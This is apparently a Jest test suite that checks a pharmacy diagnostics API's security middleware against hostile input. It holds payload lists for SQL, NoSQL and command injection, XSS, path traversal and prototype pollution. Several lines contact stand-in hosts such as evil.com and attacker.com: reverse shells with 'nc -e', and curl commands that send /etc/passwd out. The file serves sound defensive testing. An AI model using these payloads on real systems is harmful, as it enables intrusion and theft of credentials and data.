import request from 'supertest';
import express from 'express';
import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import {
    aiDiagnosticSecurityMiddleware,
    externalApiSecurityMiddleware,
    labDataSecurityMiddleware,
} from '../middlewares/securityMiddleware';
import { AuthRequest } from '../../../types/auth';

/**
 * Penetration Testing Suite for Diagnostic Security
 * Tests various attack vectors and security vulnerabilities
 */

describe('Penetration Testing - Diagnostic Security', () => {
    let app: express.Application;
    let mockUser: any;
    let mockWorkspaceContext: any;

    beforeEach(() => {
        app = express();
        app.use(express.json({ limit: '10mb' }));

        mockUser = {
            _id: 'user123',
            role: 'pharmacist',
            workplaceRole: 'pharmacist',
        };

        mockWorkspaceContext = {
            workspace: { _id: 'workspace123' },
            plan: { name: 'professional' },
            isSubscriptionActive: true,
        };

        // Mock authentication middleware
        app.use((req: AuthRequest, res, next) => {
            req.user = mockUser;
            req.workspaceContext = mockWorkspaceContext;
            next();
        });
    });

    afterEach(() => {
        jest.clearAllMocks();
    });

    describe('SQL Injection Attacks', () => {
        beforeEach(() => {
            app.use('/api/diagnostics', aiDiagnosticSecurityMiddleware);
            app.post('/api/diagnostics', (req, res) => {
                res.json({ success: true, data: req.body });
            });
        });

        it('should block classic SQL injection attempts', async () => {
            const sqlInjectionPayloads = [
                "'; DROP TABLE patients; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO admin (user) VALUES ('hacker'); --",
                "' OR 1=1 --",
                "admin'--",
                "admin'/*",
                "' OR 'x'='x",
                "'; EXEC xp_cmdshell('dir'); --",
            ];

            for (const payload of sqlInjectionPayloads) {
                const response = await request(app)
                    .post('/api/diagnostics')
                    .send({
                        symptoms: {
                            subjective: [payload],
                            severity: 'moderate',
                            onset: 'acute',
                        },
                    });

                // Should either be sanitized or blocked
                expect(response.status).toBeOneOf([200, 400]);

                if (response.status === 200) {
                    // If allowed through, should be sanitized
                    const symptom = response.body.data.symptoms.subjective[0];
                    expect(symptom).not.toContain('DROP TABLE');
                    expect(symptom).not.toContain('UNION SELECT');
                    expect(symptom).not.toContain('INSERT INTO');
                    expect(symptom).not.toContain('EXEC xp_cmdshell');
                }
            }
        });

        it('should block NoSQL injection attempts', async () => {
            const nosqlPayloads = [
                { $where: 'this.password.length > 0' },
                { $ne: null },
                { $regex: '.*' },
                { $gt: '' },
                { $exists: true },
                { $in: ['admin', 'root'] },
            ];

            for (const payload of nosqlPayloads) {
                const response = await request(app)
                    .post('/api/diagnostics')
                    .send({
                        symptoms: {
                            subjective: ['headache'],
                            severity: 'moderate',
                            onset: 'acute',
                        },
                        maliciousQuery: payload,
                    });

                expect(response.status).toBeOneOf([200, 400]);

                if (response.status === 200) {
                    // NoSQL operators should be removed or sanitized
                    const data = JSON.stringify(response.body.data);
                    expect(data).not.toContain('$where');
                    expect(data).not.toContain('$ne');
                    expect(data).not.toContain('$regex');
                }
            }
        });
    });

    describe('Cross-Site Scripting (XSS) Attacks', () => {
        beforeEach(() => {
            app.use('/api/diagnostics', aiDiagnosticSecurityMiddleware);
            app.post('/api/diagnostics', (req, res) => {
                res.json({ success: true, data: req.body });
            });
        });

        it('should sanitize script tag injections', async () => {
            const xssPayloads = [
                '<script>alert("XSS")</script>',
                '<script src="http://evil.com/xss.js"></script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>',
                '<div onclick="alert(\'XSS\')">Click me</div>',
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                '<object data="javascript:alert(\'XSS\')">',
            ];

            for (const payload of xssPayloads) {
                const response = await request(app)
                    .post('/api/diagnostics')
                    .send({
                        symptoms: {
                            subjective: [payload],
                            severity: 'moderate',
                            onset: 'acute',
                        },
                    });

                expect(response.status).toBe(200);

                const symptom = response.body.data.symptoms.subjective[0];
                expect(symptom).not.toContain('<script>');
                expect(symptom).not.toContain('javascript:');
                expect(symptom).not.toContain('onerror=');
                expect(symptom).not.toContain('onload=');
                expect(symptom).not.toContain('onclick=');
                expect(symptom).not.toContain('<iframe');
                expect(symptom).not.toContain('<object');
            }
        });

        it('should handle encoded XSS attempts', async () => {
            const encodedXssPayloads = [
                '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
                '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
                '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',
                '\\u003cscript\\u003ealert(\\u0022XSS\\u0022)\\u003c/script\\u003e',
            ];

            for (const payload of encodedXssPayloads) {
                const response = await request(app)
                    .post('/api/diagnostics')
                    .send({
                        symptoms: {
                            subjective: [payload],
                            severity: 'moderate',
                            onset: 'acute',
                        },
                    });

                expect(response.status).toBe(200);

                const symptom = response.body.data.symptoms.subjective[0];
                // Should not contain script-like patterns after decoding
                expect(symptom.toLowerCase()).not.toContain('script');
                expect(symptom.toLowerCase()).not.toContain('alert');
            }
        });
    });

    describe('Command Injection Attacks', () => {
        beforeEach(() => {
            app.use('/api/diagnostics', aiDiagnosticSecurityMiddleware);
            app.post('/api/diagnostics', (req, res) => {
                res.json({ success: true, data: req.body });
            });
        });

        it('should block command injection attempts', async () => {
            const commandInjectionPayloads = [
                '; rm -rf /',
                '| cat /etc/passwd',
                '&& whoami',
                '`id`',
                '$(whoami)',
                '; nc -e /bin/sh attacker.com 4444',
                '| curl http://evil.com/steal?data=',
                '; wget http://evil.com/malware.sh',
                '&& echo "pwned" > /tmp/hacked',
                '`curl -X POST http://evil.com/exfiltrate -d @/etc/passwd`',
            ];

            for (const payload of commandInjectionPayloads) {
                const response = await request(app)
                    .post('/api/diagnostics')
                    .send({
                        symptoms: {
                            subjective: [`headache${payload}`],
                            severity: 'moderate',
                            onset: 'acute',
                        },
                    });

                expect(response.status).toBeOneOf([200, 400]);

                if (response.status === 200) {
                    const symptom = response.body.data.symptoms.subjective[0];
                    expect(symptom).not.toContain('rm -rf');
                    expect(symptom).not.toContain('/etc/passwd');
                    expect(symptom).not.toContain('whoami');
                    expect(symptom).not.toContain('nc -e');
                    expect(symptom).not.toContain('curl');
                    expect(symptom).not.toContain('wget');
                }
            }
        });
    });

    describe('Path Traversal Attacks', () => {
        beforeEach(() => {
            app.use('/api/files', labDataSecurityMiddleware);
            app.post('/api/files', (req, res) => {
                res.json({ success: true, data: req.body });
            });
        });

        it('should block path traversal attempts', async () => {
            const pathTraversalPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
                '/var/www/../../etc/passwd',
                'file:///etc/passwd',
            ];

            for (const payload of pathTraversalPayloads) {
                const response = await request(app)
                    .post('/api/files')
                    .send({
                        filename: payload,
                        labResults: [
                            {
                                testName: 'CBC',
                                value: '5.0',
                                unit: 'mg/dL',
                            },
                        ],
                    });

                expect(response.status).toBeOneOf([200, 400]);

                if (response.status === 200) {
                    const filename = response.body.data.filename;
                    expect(filename).not.toContain('../');
                    expect(filename).not.toContain('..\\');
                    expect(filename).not.toContain('/etc/passwd');
                    expect(filename).not.toContain('system32');
                }
            }
        });
    });

    describe('Prototype Pollution Attacks', () => {
        beforeEach(() => {
            app.use('/api/diagnostics', aiDiagnosticSecurityMiddleware);
            app.post('/api/diagnostics', (req, res) => {
                res.json({ success: true, data: req.body });
            });
        });

        it('should prevent prototype pollution', async () => {
            const prototypePollutionPayloads = [
                {
                    '__proto__': { polluted: true },
                    symptoms: { subjective: ['headache'] },
                },
                {
                    'constructor': { prototype: { polluted: true } },
                    symptoms: { subjective: ['headache'] },
                },
                {
                    'prototype': { polluted: true },
                    symptoms: { subjective: ['headache'] },
                },
                {
                    symptoms: {
                        subjective: ['headache'],
                        '__proto__': { polluted: true },
                    },
                },
            ];

            for (const payload of prototypePollutionPayloads) {
                const response = await request(app)
                    .post('/api/diagnostics')
                    .send(payload);

                expect(response.status).toBe(200);

                // Prototype pollution keys should be removed
                expect(response.body.data).not.toHaveProperty('__proto__');
                expect(response.body.data).not.toHaveProperty('constructor');
                expect(response.body.data).not.toHaveProperty('prototype');

                if (response.body.data.symptoms) {
                    expect(response.body.data.symptoms).not.toHaveProperty('__proto__');
                }
            }
        });
    });

    describe('Denial of Service (DoS) Attacks', () => {
        beforeEach(() => {
            app.use('/api/diagnostics', aiDiagnosticSecurityMiddleware);
            app.post('/api/diagnostics', (req, res) => {
                res.json({ success: true, dataSize: JSON.stringify(req.body).length });
            });
        });

        it('should handle large payload attacks', async () => {
            const largePayload = {
                symptoms: {
                    subjective: Array(1000).fill('x'.repeat(1000)), // 1MB of data
                    severity: 'moderate',
                    onset: 'acute',
                },
            };

            const response = await request(app)
                .post('/api/diagnostics')
                .send(largePayload);

            // Should either reject or truncate
            expect(response.status).toBeOneOf([200, 400, 413]);

            if (response.status === 200) {
                // Data should be truncated
                expect(response.body.dataSize).toBeLessThan(JSON.stringify(largePayload).length);
            }
        });

        it('should handle deeply nested object attacks', async () => {
            // Create deeply nested object
            let deepObject: any = { value: 'test' };
            for (let i = 0; i < 100; i++) {
                deepObject = { nested: deepObject };
            }

            const response = await request(app)
                .post('/api/diagnostics')
                .send({
                    symptoms: {
                        subjective: ['headache'],
                        severity: 'moderate',
                        onset: 'acute',
                    },
                    deepNesting: deepObject,
                });

            // Should handle gracefully without crashing
            expect(response.status).toBeOneOf([200, 400]);
        });

        it('should handle circular reference attacks', async () => {
            const circularObj: any = {
                symptoms: {
                    subjective: ['headache'],
                    severity: 'moderate',
                    onset: 'acute',
                },
            };
            circularObj.self = circularObj;

            // This should not crash the server
            const response = await request(app)
                .post('/api/diagnostics')
                .send(circularObj);

            expect(response.status).toBeOneOf([200, 400]);
        });
    });

    describe('Authentication and Authorization Bypass', () => {
        it('should reject requests without authentication', async () => {
            const unauthenticatedApp = express();
            unauthenticatedApp.use(express.json());
            unauthenticatedApp.use('/api/diagnostics', aiDiagnosticSecurityMiddleware);
            unauthenticatedApp.post('/api/diagnostics', (req, res) => {
                res.json({ success: true });
            });

            const response = await request(unauthenticatedApp)
                .post('/api/diagnostics')
                .send({
                    symptoms: {
                        subjective: ['headache'],
                        severity: 'moderate',
                        onset: 'acute',
                    },
                });

            expect(response.status).toBe(401);
        });

        it('should enforce role-based access control', async () => {
            const unauthorizedApp = express();
            unauthorizedApp.use(express.json());

            // Mock user with insufficient role
            unauthorizedApp.use((req: AuthRequest, res, next) => {
                req.user = {
                    _id: 'user123',
                    role: 'patient', // Not authorized for diagnostic operations
                    workplaceRole: 'patient',
                };
                req.workspaceContext = mockWorkspaceContext;
                next();
            });

            unauthorizedApp.use('/api/diagnostics', aiDiagnosticSecurityMiddleware);
            unauthorizedApp.post('/api/diagnostics', (req, res) => {
                res.json({ success: true });
            });

            const response = await request(unauthorizedApp)
                .post('/api/diagnostics')
                .send({
                    symptoms: {
                        subjective: ['headache'],
                        severity: 'moderate',
                        onset: 'acute',
                    },
                });

            expect(response.status).toBe(403);
        });
    });

    describe('Rate Limiting Bypass Attempts', () => {
        beforeEach(() => {
            app.use('/api/diagnostics', aiDiagnosticSecurityMiddleware);
            app.post('/api/diagnostics', (req, res) => {
                res.json({ success: true });
            });
        });

        it('should enforce rate limits even with different IPs', async () => {
            const requests = [];

            // Attempt to bypass rate limiting with different IP headers
            for (let i = 0; i < 30; i++) {
                const request_promise = request(app)
                    .post('/api/diagnostics')
                    .set('X-Forwarded-For', `192.168.1.${i}`)
                    .set('X-Real-IP', `10.0.0.${i}`)
                    .send({
                        symptoms: {
                            subjective: ['headache'],
                            severity: 'moderate',
                            onset: 'acute',
                        },
                    });

                requests.push(request_promise);
            }

            const responses = await Promise.all(requests);

            // Should eventually hit rate limits
            const rateLimitedResponses = responses.filter(res => res.status === 429);
            expect(rateLimitedResponses.length).toBeGreaterThan(0);
        });
    });

    describe('Data Exfiltration Attempts', () => {
        beforeEach(() => {
            app.use('/api/diagnostics', aiDiagnosticSecurityMiddleware);
            app.post('/api/diagnostics', (req, res) => {
                res.json({ success: true, data: req.body });
            });
        });

        it('should detect and prevent sensitive data exfiltration', async () => {
            const exfiltrationAttempt = {
                symptoms: {
                    subjective: ['headache'],
                    severity: 'moderate',
                    onset: 'acute',
                },
                // Attempt to exfiltrate sensitive data
                apiKey: 'sk-or-stolen-key-123456789',
                password: 'admin-password-123',
                secretToken: 'bearer-secret-token',
                databaseUrl: 'mongodb://admin:password@localhost:27017/pharmadb',
                awsAccessKey: 'AKIAIOSFODNN7EXAMPLE',
                privateKey: '-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...',
            };

            const response = await request(app)
                .post('/api/diagnostics')
                .send(exfiltrationAttempt);

            expect(response.status).toBe(200);

            // Sensitive fields should be removed
            expect(response.body.data).not.toHaveProperty('apiKey');
            expect(response.body.data).not.toHaveProperty('password');
            expect(response.body.data).not.toHaveProperty('secretToken');
            expect(response.body.data).not.toHaveProperty('databaseUrl');
            expect(response.body.data).not.toHaveProperty('awsAccessKey');
            expect(response.body.data).not.toHaveProperty('privateKey');

            // Should have warning header
            expect(response.headers['x-security-warning']).toBeDefined();
        });
    });

    describe('Advanced Persistent Threat (APT) Simulation', () => {
        it('should detect sophisticated multi-vector attacks', async () => {
            const sophisticatedAttack = {
                symptoms: {
                    subjective: [
                        'headache<script>fetch("/api/admin/users").then(r=>r.json()).then(d=>fetch("http://evil.com/exfiltrate",{method:"POST",body:JSON.stringify(d)}))</script>',
                        "nausea'; DROP TABLE patients; INSERT INTO admin_users (username, password) VALUES ('hacker', 'pwned'); --",
                    ],
                    severity: 'severe',
                    onset: 'acute',
                    '__proto__': { isAdmin: true },
                },
                vitalSigns: {
                    heartRate: '72; $(curl http://evil.com/callback?data=$(cat /etc/passwd | base64))',
                    temperature: 37.0,
                },
                currentMedications: [
                    {
                        name: 'Aspirin',
                        dosage: '200mg',
                        frequency: 'daily',
                        '__proto__': { bypass: true },
                    },
                ],
                // Attempt multiple injection vectors
                apiKey: 'sk-or-stolen-key',
                token: 'bearer-token',
                constructor: { prototype: { polluted: true } },
                // Command injection in nested field
                patientNotes: 'Patient complains of headache | nc -e /bin/sh attacker.com 4444',
                // Path traversal
                reportPath: '../../../etc/passwd',
                // XSS in multiple fields
                allergyNotes: '<iframe src="javascript:alert(document.cookie)"></iframe>',
            };

            const response = await request(app)
                .post('/api/diagnostics')
                .send(sophisticatedAttack);

            expect(response.status).toBeOneOf([200, 400]);

            if (response.status === 200) {
                const data = response.body.data;

                // All malicious content should be sanitized or removed
                expect(JSON.stringify(data)).not.toContain('<script>');
                expect(JSON.stringify(data)).not.toContain('DROP TABLE');
                expect(JSON.stringify(data)).not.toContain('$(curl');
                expect(JSON.stringify(data)).not.toContain('nc -e');
                expect(JSON.stringify(data)).not.toContain('../../../etc/passwd');
                expect(JSON.stringify(data)).not.toContain('<iframe');
                expect(JSON.stringify(data)).not.toContain('javascript:');

                // Prototype pollution should be prevented
                expect(data).not.toHaveProperty('__proto__');
                expect(data).not.toHaveProperty('constructor');

                // Sensitive keys should be removed
                expect(data).not.toHaveProperty('apiKey');
                expect(data).not.toHaveProperty('token');

                // Should trigger security warnings
                expect(response.headers['x-security-warning']).toBeDefined();
            }
        });
    });
});